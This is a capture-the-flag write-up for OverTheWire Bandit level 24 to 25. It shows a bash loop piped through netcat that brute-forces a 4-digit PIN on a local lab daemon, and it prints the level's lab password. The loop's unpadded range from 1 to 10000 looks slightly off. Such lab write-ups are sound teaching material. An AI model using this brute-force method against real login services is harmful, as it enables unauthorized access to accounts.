**Bandit Level 24 → Level 25 Write-up**

**Level Goal**



A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.



You do not need to create new connections each time



**Concepts Tested**



* Brute-force attacks
* Network communication with netcat
* Writing bash scripts for automation
* Working with loops and pipes
* Understanding brute-force methodology
* Efficient scripting techniques



**Solution**



Step 1: Connect to Bandit Level 24



SSH into the server using the password from the previous level:



```bash ssh bandit24@bandit.labs.overthewire.org -p 2220 ```



Step 2: Test the Service



First, understand how the service works by connecting to it:



```bash nc localhost 30002 ```



You'll see a message like:



I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.



Try a test input (replace with your actual password):



gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1234



You'll get:



Wrong! Please enter the correct pincode. Try again.



Exit with Ctrl+C or Ctrl+D.



Step 3: Get the Current Password



Get bandit24's password:



```bash cat /etc/bandit_pass/bandit24 ```



Step 4: Create a Working Directory



Create a temporary directory:



```bash mktemp -d ```



```bash cd /tmp/tmp.XXXXXXXXXX ```



Step 5: Create and Run the Brute-Force Script



Create a script that generates and sends all combinations directly:



```bash nano brute.sh ```



Write the following script:





p="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for i in {1..10000}

do

   echo "$p $i"

done | nc localhost 30002





Important: Replace the password with your actual bandit24 password!



Save and exit (Ctrl+O, Enter, Ctrl+X).



Step 6: Make the Script Executable



Set execute permissions:



```bash chmod +x brute.sh ```



Step 7: Run the Script



Execute the script:



```bash ./brute.sh ```



The script will:





Generate all combinations from 1 to 10000

Send them directly to the service via netcat

Display all responses





You'll see many "Wrong!" messages scroll by, and eventually:

Wrong! Please enter the correct pincode. Try again.

Wrong! Please enter the correct pincode. Try again.

...

Correct!

The password of user bandit25 is [password_here]



Exiting.





**password level 24-25:** #################################









